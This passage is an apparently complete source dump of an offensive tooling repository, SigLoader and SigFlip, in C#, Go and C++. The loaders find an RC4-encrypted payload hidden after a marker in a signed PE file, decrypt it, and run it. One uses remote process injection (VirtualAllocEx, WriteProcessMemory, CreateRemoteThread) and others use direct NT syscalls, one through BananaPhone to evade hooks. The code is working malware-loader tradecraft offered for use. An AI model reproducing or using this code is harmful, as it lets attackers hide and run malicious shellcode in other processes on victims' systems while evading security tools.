        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int GetLastError();
        public static void rexec(int pid, byte[] scode)
        {
            int PID = pid;
            byte[] payload = scode;

            Console.WriteLine("[+]: Opening Remote Process PID: {0}", PID);
            IntPtr hProc = OpenProcess(0x001F0FFF, false, PID);
            if (hProc == IntPtr.Zero)
            {
                Console.WriteLine("OpenProcess Failed. Error: {0}", GetLastError());
                return;
            }

            IntPtr mem;
            mem = VirtualAllocEx(hProc, IntPtr.Zero, (uint)payload.Length, 0x1000, 0x40);
            Console.WriteLine("[+]: Memory allocated at 0x{0}", mem.ToString("X"));

            if (mem == IntPtr.Zero)
            {
                Console.WriteLine("VirtualAllocEx Failed. Error: {0}", GetLastError());
                return;
            }

            if (!WriteProcessMemory(hProc, mem, payload, payload.Length, out var bytes))
            {
                Console.WriteLine("WriteProcessMemory Failed. Error: {0}", GetLastError());
                return;
            }

            IntPtr hThread;
            hThread = CreateRemoteThread(hProc, IntPtr.Zero, 0, mem, IntPtr.Zero, 0, out var ThreadID);
            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("CreateRemoteThread Failed. Error: {0}", GetLastError());
                return;
            }
            Console.WriteLine("[+]: Thread located at 0x{0}", hThread.ToString("X"));
            Console.WriteLine("[*]: Payload executed in the context of PID: {0}", PID);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
            Console.WriteLine("Done.");
        }
    }
}



```

`DotNet/SigLoader/SigLoader/Program.cs`:

```cs
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace SigLoader
{
    public class Program
    {
        public static string _pePath = "";
        public static string _encKey = "";
        public static string _pid = "";
        public static byte[] _tag = { 0xfe, 0xed, 0xfa, 0xce, 0xfe, 0xed, 0xfa, 0xce };
        public static void Main(string[] args)
        {
            ArgumentParser _parser = new ArgumentParser(args);

            if (args.Length <= 0 || _parser.GetOrDefault("h", "help") == "true") {
                Help();
            }


            if (_parser.GetOrDefault("f", "null") != "null") {
                _pePath = _parser.GetOrDefault("f", "null");
                _encKey = _parser.GetOrDefault("e", "null");
                _pid = _parser.GetOrDefault("pid", "null");

                if (_pePath == "null") Help();
                if (_pid == "null") Help();
            }

            else {
                Help();
            }

            if (!File.Exists(_pePath)) Help();

            Console.WriteLine("[+]:Loading/Parsing PE File '{0}'", _pePath);
            Console.WriteLine();

            byte[] _peBlob = Utils.Read(_pePath);
            int _dataOffset = Utils.scanPattern(_peBlob, _tag);

            Console.WriteLine("[+]:Scanning for Shellcode...");
            if ( _dataOffset == -1) {
                Console.WriteLine("Could not locate data or shellcode");
                Environment.Exit(0);
            }

            Stream stream = new MemoryStream(_peBlob);
            long pos = stream.Seek(_dataOffset + _tag.Length, SeekOrigin.Begin);
            Console.WriteLine("[+]: Shellcode located at {0:x2}", pos);
            byte[] shellcode = new byte[_peBlob.Length - (pos + _tag.Length)];
            stream.Read(shellcode, 0, (_peBlob.Length)- ((int)pos + _tag.Length));
            byte[] _data = Utils.Decrypt(shellcode, _encKey);
            
            stream.Close();

            //Execute shellcode (just a basic/vanilla local shellcode injection logic, make sure to CHANGE this and use your custom shellcode loader.
            
            //CreateThread
            //ExecShellcode(_data);

            //CreateRemoteThread 
            Loader.rexec(Convert.ToInt32(_pid), _data);
           

            }

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void ExecShellcode(byte[] shellcode)
        {
            uint threadId;

            IntPtr alloc = VirtualAlloc(IntPtr.Zero, shellcode.Length, 0x1000 | 0x2000, 0x40);
            if (alloc == IntPtr.Zero)
            {
                return;
            }

            Marshal.Copy(shellcode, 0, alloc, shellcode.Length);
            IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, out threadId);
            WaitForSingleObject(threadHandle, 0xFFFFFFFF);
        }

        public static void Help()
        {
            Console.WriteLine();
            Console.WriteLine("Usage:");
            Console.WriteLine(@"   c:\> SigLoader.exe -f <PE_FILE_PATH> -e <ENCRYPTION_KEY> -pid <PROCESS_ID>");
            Console.WriteLine();
            Console.WriteLine(@"   c:\> SigLoader.exe -f C:\Temp\kernel32.dll -e TestKey -pid <PROCESS_ID>");
            Console.WriteLine(@"   c:\> SigLoader.exe -f C:\Temp\MSBuild.exe -e TestKey -pid <PROCESS_ID>");
            Environment.Exit(0);
        }


    }
}

```

`DotNet/SigLoader/SigLoader/Properties/AssemblyInfo.cs`:

```cs
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

// General Information about an assembly is controlled through the following
// set of attributes. Change these attribute values to modify the information
// associated with an assembly.
[assembly: AssemblyTitle("SigLoader")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("SigLoader")]
[assembly: AssemblyCopyright("Copyright ©  2021")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]

// Setting ComVisible to false makes the types in this assembly not visible
// to COM components.  If you need to access a type in this assembly from
// COM, set the ComVisible attribute to true on that type.
[assembly: ComVisible(false)]

// The following GUID is for the ID of the typelib if this project is exposed to COM
[assembly: Guid("9df63ff8-3d55-4d9e-8088-03b92d6584e1")]

// Version information for an assembly consists of the following four values:
//
//      Major Version
//      Minor Version
//      Build Number
//      Revision
//
// You can specify all the values or you can default the Build and Revision Numbers
// by using the '*' as shown below:
// [assembly: AssemblyVersion("1.0.*")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]

```

`DotNet/SigLoader/SigLoader/SigLoader.csproj`:

```csproj
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
  <PropertyGroup>
    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
    <ProjectGuid>{9DF63FF8-3D55-4D9E-8088-03B92D6584E1}</ProjectGuid>
    <OutputType>Exe</OutputType>
    <RootNamespace>SigLoader</RootNamespace>
    <AssemblyName>SigLoader</AssemblyName>
    <TargetFrameworkVersion>v4.6.1</TargetFrameworkVersion>
    <FileAlignment>512</FileAlignment>
    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
    <Deterministic>true</Deterministic>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
    <PlatformTarget>AnyCPU</PlatformTarget>
    <DebugSymbols>true</DebugSymbols>
    <DebugType>full</DebugType>
    <Optimize>false</Optimize>
    <OutputPath>bin\Debug\</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
    <PlatformTarget>AnyCPU</PlatformTarget>
    <DebugType>pdbonly</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>bin\Release\</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Debug|x64'">
    <DebugSymbols>true</DebugSymbols>
    <OutputPath>bin\x64\Debug\</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <DebugType>full</DebugType>
    <PlatformTarget>x64</PlatformTarget>
    <ErrorReport>prompt</ErrorReport>
    <CodeAnalysisRuleSet>MinimumRecommendedRules.ruleset</CodeAnalysisRuleSet>
    <Prefer32Bit>true</Prefer32Bit>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Release|x64'">
    <OutputPath>bin\x64\Release\</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <Optimize>true</Optimize>
    <DebugType>pdbonly</DebugType>
    <PlatformTarget>x64</PlatformTarget>
    <ErrorReport>prompt</ErrorReport>
    <CodeAnalysisRuleSet>MinimumRecommendedRules.ruleset</CodeAnalysisRuleSet>
    <Prefer32Bit>true</Prefer32Bit>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Debug|x86'">
    <DebugSymbols>true</DebugSymbols>
    <OutputPath>bin\x86\Debug\</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <DebugType>full</DebugType>
    <PlatformTarget>x86</PlatformTarget>
    <ErrorReport>prompt</ErrorReport>
    <CodeAnalysisRuleSet>MinimumRecommendedRules.ruleset</CodeAnalysisRuleSet>
    <Prefer32Bit>true</Prefer32Bit>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Release|x86'">
    <OutputPath>bin\x86\Release\</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <Optimize>true</Optimize>
    <DebugType>pdbonly</DebugType>
    <PlatformTarget>x86</PlatformTarget>
    <ErrorReport>prompt</ErrorReport>
    <CodeAnalysisRuleSet>MinimumRecommendedRules.ruleset</CodeAnalysisRuleSet>
    <Prefer32Bit>true</Prefer32Bit>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="System" />
    <Reference Include="System.Core" />
    <Reference Include="System.Xml.Linq" />
    <Reference Include="System.Data.DataSetExtensions" />
    <Reference Include="Microsoft.CSharp" />
    <Reference Include="System.Data" />
    <Reference Include="System.Net.Http" />
    <Reference Include="System.Xml" />
  </ItemGroup>
  <ItemGroup>
    <Compile Include="Loader.cs" />
    <Compile Include="Program.cs" />
    <Compile Include="Properties\AssemblyInfo.cs" />
    <Compile Include="Utils.cs" />
  </ItemGroup>
  <ItemGroup>
    <None Include="App.config" />
  </ItemGroup>
  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
</Project>
```

`DotNet/SigLoader/SigLoader/SigLoader.csproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Debug|AnyCPU'">
    <StartArguments></StartArguments>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Debug|x64'">
    <StartArguments></StartArguments>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Debug|x86'">
    <StartArguments></StartArguments>
  </PropertyGroup>
</Project>

```

`DotNet/SigLoader/SigLoader/Utils.cs`:

```cs
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace SigLoader
{
    public class Utils
    {

       
        public static int scanPattern(byte[] _peBytes, byte[] pattern)
        {
            int _max = _peBytes.Length - pattern.Length + 1;
            int j;
            for (int i = 0; i < _max; i++) {
                if (_peBytes[i] != pattern[0]) continue;
                for (j = pattern.Length - 1; j >= 1 && _peBytes[i + j] == pattern[j]; j--) ;
                if (j == 0) return i;
            }
            return -1;
        }

        public static void WriteFile(string filename, byte[] rawData)
        {
            FileStream fs = new FileStream(filename, FileMode.OpenOrCreate);
            fs.Write(rawData, 0, rawData.Length);
            fs.Close();
        }


        public static byte[] Read(string filePath)
        {
            using (FileStream stream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
            {
                byte[] rawData = new byte[stream.Length];
                stream.Read(rawData, 0, (int)stream.Length);
                stream.Close();

                return rawData;
            }
        }

       
        public static byte[] Decrypt(byte[] data, string encKey)
        {
            byte[] T = new byte[256];
            byte[] S = new byte[256];
            int keyLen = encKey.Length;
            int dataLen = data.Length;
            byte[] result = new byte[dataLen];
            byte tmp;
            int j = 0, t = 0, i = 0;


            for (i = 0; i < 256; i++)
            {
                S[i] = Convert.ToByte(i);
                T[i] = Convert.ToByte(encKey[i % keyLen]);
            }

            for (i = 0; i < 256; i++)
            {
                j = (j + S[i] + T[i]) % 256;
                tmp = S[j];
                S[j] = S[i];
                S[i] = tmp;
            }
            j = 0;
            for (int x = 0; x < dataLen; x++)
            {
                i = (i + 1) % 256;
                j = (j + S[i]) % 256;

                tmp = S[j];
                S[j] = S[i];
                S[i] = tmp;

                t = (S[i] + S[j]) % 256;

                result[x] = Convert.ToByte(data[x] ^ S[t]);
            }

            return result;
        }


    }

    //stolen from https://www.codeproject.com/Articles/3111/C-NET-Command-Line-Arguments-Parser
    public class ArgumentParser
    {
        private StringDictionary Parameters;

        public ArgumentParser(string[] Args)
        {
            Parameters = new StringDictionary();
            Regex Spliter = new Regex(@"^-{1,2}",
                RegexOptions.IgnoreCase | RegexOptions.Compiled);

            Regex Remover = new Regex(@"^['""]?(.*?)['""]?$",
                RegexOptions.IgnoreCase | RegexOptions.Compiled);

            string Parameter = null;
            string[] Parts;

            foreach (string Txt in Args)
            {
                Parts = Spliter.Split(Txt, 3);

                switch (Parts.Length)
                {
                    case 1:
                        if (Parameter != null)
                        {
                            if (!Parameters.ContainsKey(Parameter))
                            {
                                Parts[0] =
                                    Remover.Replace(Parts[0], "$1");

                                Parameters.Add(Parameter, Parts[0]);
                            }
                            Parameter = null;
                        }

                        break;

                    case 2:

                        if (Parameter != null)
                        {
                            if (!Parameters.ContainsKey(Parameter))
                                Parameters.Add(Parameter, "true");
                        }
                        Parameter = Parts[1];
                        break;

                    case 3:
                        if (Parameter != null)
                        {
                            if (!Parameters.ContainsKey(Parameter))
                                Parameters.Add(Parameter, "true");
                        }

                        Parameter = Parts[1];

                        if (!Parameters.ContainsKey(Parameter))
                        {
                            Parts[2] = Remover.Replace(Parts[2], "$1");
                            Parameters.Add(Parameter, Parts[2]);
                        }

                        Parameter = null;
                        break;
                }
            }
            if (Parameter != null)
            {
                if (!Parameters.ContainsKey(Parameter))
                    Parameters.Add(Parameter, "true");
            }
        }

        public string this[string Param]
        {
            get
            {
                return (Parameters[Param]);
            }
        }

        public string GetOrDefault(string key, string defaultValue)
        {
            if (!Parameters.ContainsKey(key))
            {
                return defaultValue;
            }

            return Parameters[key];
        }
    }
}

```

`Golang/BananaPhoneVer/SigLoader.go`:

```go
package main

import (
	"fmt"
	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"
)



func scanPattern(peBytes []byte, pattern []byte) int{
	var max = len(peBytes) - len(pattern) + 1
	var j int
	for i := 0; i < max; i++ {
		if peBytes[i] != pattern[0] { continue}
		for j = len(pattern) - 1; j >= 1 && peBytes[i + j] == pattern[j]; j--{}
		if j == 0{return i}
	}
	return -1
}

func Decrypt(data []byte,encKey string)[]byte{
	keyLen := len(encKey)
	dataLen := len(data)
	var tmp byte
	result := make([]byte,dataLen)
	var j = 0
	var t = 0
	var i = 0
	var S [256]byte
	var T [256]byte


	for i = 0; i < 256; i++	{
		S[i] = uint8(i)
		T[i] = encKey[i % keyLen]
	}

	for i = 0; i < 256; i++	{
		j = (j + int(S[i]) + int(T[i])) % 256
		tmp = S[j]
		S[j] = S[i]
		S[i] = tmp
	}
	j = 0
	for x := 0; x < dataLen; x++{
		i = (i + 1) % 256
		j = (j + int(S[i])) % 256

		tmp = S[j]
		S[j] = S[i]
		S[i] = tmp

		t = (int(S[i]) + int(S[j])) % 256

		result[x] = data[x] ^ S[t]
	}
	return result
}

func createTh(scci []byte,hand1e uintptr, a11o,wr1te,cth uint16) {
	shellcode := append(scci,[]byte("0x00")[0])
	const (
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)
	//hand1e := uintptr(windows.CurrentProcess()) //special macro that says 'use this thread/process' when provided as a handle.
	var baseA uintptr
	regionsize := uintptr(len(shellcode))
	_, r := bananaphone.Syscall(
		a11o, //Ntallocatevirtualmemory
		hand1e,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_EXECUTE_READWRITE,
	)
	if r != nil {
		return
	}
	//NtWriteVirtualMemory
	_, r = bananaphone.Syscall(
		wr1te, //NtWriteVirtualMemory
		hand1e,
		baseA,
		uintptr(unsafe.Pointer(&shellcode[0])),
		regionsize,
		0,
	)
	if r != nil {
		return
	}
	var hhosthread uintptr
	_, r = bananaphone.Syscall(
		cth,                                  //NtCreateThreadEx
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		hand1e,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
	if r != nil {
		return
	}
}


func main(){
	if len(os.Args)<3 || os.Args[1] == "-h"{
		fmt.Println("help:\n    SigLoader.exe target.exe DecryptKey")
		os.Exit(0)
	}
	name := os.Args[1]
	encKey := os.Args[2]
	var tag = []byte{0xfe, 0xed, 0xfa, 0xce, 0xfe, 0xed, 0xfa, 0xce}

	df, e := ioutil.ReadFile(string(name))
	if e != nil {
		fmt.Println("Could not load PE File")
		os.Exit(0)
	}
	fmt.Println("[+]:Scanning for Shellcode...")
	dataOffset := scanPattern(df,tag)
	if dataOffset == -1{
		fmt.Println("Could not locate data or shellcode")
		os.Exit(0)
	}
	pos := dataOffset+len(tag)
	fmt.Printf("[+]:Shellcode located at %x\n", pos)
	shellcode := df[pos:]
	data := Decrypt(shellcode,encKey)
	fmt.Println("[+]:Shellcode Decrypted")


	fmt.Println("[+]:Shellcode Executing")

	fmt.Println("Mess with the banana, die like the... banana?")
	bp, e := bananaphone.NewBananaPhone(bananaphone.DiskBananaPhoneMode)
	if e != nil {
		panic(e)
	}

	//resolve the functions and extract the syscalls
	alloc, e := bp.GetSysID("NtAllocateVirtualMemory")
	if e != nil {
		panic(e)
	}
	wr1te, e := bp.GetSysID("NtWriteVirtualMemory")
	if e != nil {
		panic(e)
	}
	cth, e := bp.GetSysID("NtCreateThreadEx")
	if e != nil {
		panic(e)
	}

	createTh(data,uintptr(0xffffffffffffffff),alloc,wr1te,cth)
}

```

`Golang/BananaPhoneVer/go.mod`:

```mod
module SigLoader

go 1.16

require (
	github.com/C-Sto/BananaPhone v0.0.0-20201003062936-916e63b713df
	golang.org/x/sys v0.0.0-20210809222454-d867a43fc93e // indirect
)

```

`Golang/BananaPhoneVer/go.sum`:

```sum
github.com/Binject/debug v0.0.0-20200830173345-f54480b6530f h1:aANCCkNbGzwXFh7dubh5FgvlZXuyRnZHcHZXmkRLV/A=
github.com/Binject/debug v0.0.0-20200830173345-f54480b6530f/go.mod h1:QzgxDLY/qdKlvnbnb65eqTedhvQPbaSP2NqIbcuKvsQ=
github.com/C-Sto/BananaPhone v0.0.0-20201003062936-916e63b713df h1:0xMqCgH48h3CeCyMjLfW7B9/4qifjqmGNGn2B0UM244=
github.com/C-Sto/BananaPhone v0.0.0-20201003062936-916e63b713df/go.mod h1:QsEPWHZooj8uXL2YEdpQX+hDr00Plw7myenTiduBHRA=
github.com/awgh/rawreader v0.0.0-20200626064944-56820a9c6da4 h1:cIAK2NNf2yafdgpFRNJrgZMwvy61BEVpGoHc2n4/yWs=
github.com/awgh/rawreader v0.0.0-20200626064944-56820a9c6da4/go.mod h1:SalMPBCab3yuID8nIhLfzwoBV+lBRyaC7NhuN8qL8xE=
golang.org/x/sys v0.0.0-20200828194041-157a740278f4/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
golang.org/x/sys v0.0.0-20210809222454-d867a43fc93e h1:WUoyKPm6nCo1BnNUvPGnFG3T5DUVem42yDJZZ4CNxMA=
golang.org/x/sys v0.0.0-20210809222454-d867a43fc93e/go.mod h1:oPkhp1MJrh7nUepCBck5+mAzfO9JrbApNNgaTdGDITg=

```

`Golang/SigLoader.go`:

```go
package main

import (
	"fmt"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"
)



func scanPattern(peBytes []byte, pattern []byte) int{
	var max = len(peBytes) - len(pattern) + 1
	var j int
	for i := 0; i < max; i++ {
		if peBytes[i] != pattern[0] { continue}
		for j = len(pattern) - 1; j >= 1 && peBytes[i + j] == pattern[j]; j--{}
		if j == 0{return i}
	}
	return -1
}

func Decrypt(data []byte,encKey string)[]byte{
	keyLen := len(encKey)
	dataLen := len(data)
	var tmp byte
	result := make([]byte,dataLen)
	var j = 0
	var t = 0
	var i = 0
	var S [256]byte
	var T [256]byte


	for i = 0; i < 256; i++	{
		S[i] = uint8(i)
		T[i] = encKey[i % keyLen]
	}

	for i = 0; i < 256; i++	{
		j = (j + int(S[i]) + int(T[i])) % 256
		tmp = S[j]
		S[j] = S[i]
		S[i] = tmp
	}
	j = 0
	for x := 0; x < dataLen; x++{
		i = (i + 1) % 256
		j = (j + int(S[i])) % 256

		tmp = S[j]
		S[j] = S[i]
		S[i] = tmp

		t = (int(S[i]) + int(S[j])) % 256

		result[x] = data[x] ^ S[t]
	}
	return result
}


func createTh(scci []byte,hand1e uintptr) {
	shellcode := append(scci,[]byte("0x00")[0])
	ntdll := windows.NewLazyDLL("ntdll.dll")
	ntAllocateVirtualMemory := ntdll.NewProc("NtAllocateVirtualMemory")
	ntWriteVirtualMemory := ntdll.NewProc("NtWriteVirtualMemory")
	ntCreateThreadEx := ntdll.NewProc("NtCreateThreadEx")

	//hand1e := uintptr(windows.CurrentProcess()) //special macro that says 'use this thread/process' when provided as a handle.
	var baseA uintptr
	regionsize := uintptr(len(shellcode))

	allocResult, _, err := ntAllocateVirtualMemory.Call(
		uintptr(hand1e),                   // HANDLE to the target process
		uintptr(unsafe.Pointer(&baseA)),   // Pointer that receives the allocated base address of the memory
		0,                                       // Number of zeros needed, can ignore this
		uintptr(unsafe.Pointer(&regionsize)), // Pointer to a UINT32 to received the total allocated size
		windows.MEM_COMMIT,                      // Memory options
		windows.PAGE_EXECUTE_READWRITE,          // Memory page security options
	)
	if allocResult > 0 {
		panic("NtAllocateVirtualMemory failed: " + err.Error())
	}

	//NtWriteVirtualMemory
	writeResult, _, err := ntWriteVirtualMemory.Call(
		uintptr(hand1e),
		uintptr(baseA),
		uintptr(unsafe.Pointer(&shellcode[0])),
		regionsize,
		0,
	)
	if writeResult > 0 {
		panic("NtWriteVirtualMemory failed: " + err.Error())
	}

	var threadHandle uintptr
	execResult, _, err := ntCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&threadHandle)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		uintptr(hand1e),                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	if execResult > 0 {
		panic("NtCreateThreadEx failed: " + err.Error())
	}
	syscall.WaitForSingleObject(syscall.Handle(threadHandle), 0xffffffff)

}

func main(){
	if len(os.Args)<3 || os.Args[1] == "-h"{
		fmt.Println("help:\n    SigLoader.exe target.exe DecryptKey")
		os.Exit(0)
	}
	name := os.Args[1]
	encKey := os.Args[2]
	var tag = []byte{0xfe, 0xed, 0xfa, 0xce, 0xfe, 0xed, 0xfa, 0xce}

	df, e := ioutil.ReadFile(string(name))
	if e != nil {
		fmt.Println("Could not load PE File")
		os.Exit(0)
	}
	fmt.Println("[+]:Scanning for Shellcode...")
	dataOffset := scanPattern(df,tag)
	if dataOffset == -1{
		fmt.Println("Could not locate data or shellcode")
		os.Exit(0)
	}
	pos := dataOffset+len(tag)
	fmt.Printf("[+]:Shellcode located at %x\n", pos)
	shellcode := df[pos:]
	data := Decrypt(shellcode,encKey)
	fmt.Println("[+]:Shellcode Decrypted")


	fmt.Println("[+]:Shellcode Executing")


	createTh(data,uintptr(0xffffffffffffffff))
}

```

`Golang/go.mod`:

```mod
module SigLoader

go 1.16

require (
	github.com/C-Sto/BananaPhone v0.0.0-20201003062936-916e63b713df
	golang.org/x/sys v0.0.0-20210809222454-d867a43fc93e // indirect
)

```

`Golang/go.sum`:

```sum
github.com/Binject/debug v0.0.0-20200830173345-f54480b6530f h1:aANCCkNbGzwXFh7dubh5FgvlZXuyRnZHcHZXmkRLV/A=
github.com/Binject/debug v0.0.0-20200830173345-f54480b6530f/go.mod h1:QzgxDLY/qdKlvnbnb65eqTedhvQPbaSP2NqIbcuKvsQ=
github.com/C-Sto/BananaPhone v0.0.0-20201003062936-916e63b713df h1:0xMqCgH48h3CeCyMjLfW7B9/4qifjqmGNGn2B0UM244=
github.com/C-Sto/BananaPhone v0.0.0-20201003062936-916e63b713df/go.mod h1:QsEPWHZooj8uXL2YEdpQX+hDr00Plw7myenTiduBHRA=
github.com/awgh/rawreader v0.0.0-20200626064944-56820a9c6da4 h1:cIAK2NNf2yafdgpFRNJrgZMwvy61BEVpGoHc2n4/yWs=
github.com/awgh/rawreader v0.0.0-20200626064944-56820a9c6da4/go.mod h1:SalMPBCab3yuID8nIhLfzwoBV+lBRyaC7NhuN8qL8xE=
golang.org/x/sys v0.0.0-20200828194041-157a740278f4/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
golang.org/x/sys v0.0.0-20210809222454-d867a43fc93e h1:WUoyKPm6nCo1BnNUvPGnFG3T5DUVem42yDJZZ4CNxMA=
golang.org/x/sys v0.0.0-20210809222454-d867a43fc93e/go.mod h1:oPkhp1MJrh7nUepCBck5+mAzfO9JrbApNNgaTdGDITg=

```

`LICENSE`:

```
MIT License

Copyright (c) 2021 Mohamed El Azaar

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`Native/SigFlip/SigFlip.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 15
VisualStudioVersion = 15.0.28010.2003
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "SigFlip", "SigFlip\SigFlip.vcxproj", "{8BF7FDAF-5ABF-41C3-BBA8-F92AE6A7C1A2}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{8BF7FDAF-5ABF-41C3-BBA8-F92AE6A7C1A2}.Debug|x64.ActiveCfg = Debug|x64
		{8BF7FDAF-5ABF-41C3-BBA8-F92AE6A7C1A2}.Debug|x64.Build.0 = Debug|x64
		{8BF7FDAF-5ABF-41C3-BBA8-F92AE6A7C1A2}.Debug|x86.ActiveCfg = Debug|Win32
		{8BF7FDAF-5ABF-41C3-BBA8-F92AE6A7C1A2}.Debug|x86.Build.0 = Debug|Win32
		{8BF7FDAF-5ABF-41C3-BBA8-F92AE6A7C1A2}.Release|x64.ActiveCfg = Release|x64
		{8BF7FDAF-5ABF-41C3-BBA8-F92AE6A7C1A2}.Release|x64.Build.0 = Release|x64
		{8BF7FDAF-5ABF-41C3-BBA8-F92AE6A7C1A2}.Release|x86.ActiveCfg = Release|Win32
		{8BF7FDAF-5ABF-41C3-BBA8-F92AE6A7C1A2}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {FCE62A23-B3DA-4C51-BFAC-AA4313CDEBEA}
	EndGlobalSection
EndGlobal

```

`Native/SigFlip/SigFlip/Helper.cpp`:

```cpp
#include "pch.h"
#include "Helper.h"

unsigned short ChkSum(unsigned int CheckSum, void *FileBase, int Length)
{

	int *Data;
	int sum;

	if (Length && FileBase != NULL)
	{
		Data = (int *)FileBase;
		do
		{
			sum = *(unsigned short *)Data + CheckSum;
			Data = (int *)((char *)Data + 2);
			CheckSum = (unsigned short)sum + (sum >> 16);
		} while (--Length);
	}

